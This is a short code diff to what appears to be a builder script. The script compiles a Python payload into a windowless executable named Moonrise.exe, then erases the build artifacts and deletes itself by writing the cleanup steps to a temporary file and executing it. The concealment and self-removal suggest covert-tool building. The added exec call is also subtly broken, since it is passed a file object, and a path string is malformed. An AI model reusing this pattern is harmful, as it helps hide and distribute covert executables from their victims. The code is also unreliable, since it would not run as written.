@@ -34,12 +34,19 @@ else:
     with open(f"{filename}.py", 'wb') as file:
         file.write(data)
     os.system(f"pyinstaller --onefile --noconsole --log-level=ERROR -i NONE {filename}.py ")
-    shutil.move(f"{os.getcwd()}\\dist\\Moonrise.exe", f"{os.getcwd()}\\Moonrise.exe")
-    shutil.rmtree('build')
-    shutil.rmtree('dist')
-    os.remove(f'Moonrise.spec')
-    os.remove(f'Moonrise.py')
-    
+    data = '''
+shutil.move(f"{os.getcwd()}\\dist\\Moonrise.exe", f"{os.getcwd()}\\Moonrise.exe")
+shutil.rmtree('build')
+shutil.rmtree('dist')
+os.remove(f'Moonrise.spec')
+os.remove(f'Moonrise.py')
+dir = os.getcwd()
+os.remove(dir+'\%s' % sys.argv[0])
+'''
+    with open("ignore.py", 'w') as file:
+        file.write(data)
+    exec(open("ignore.py"))
+    exit()
 try:
     os.mkdir('./util')
 except:
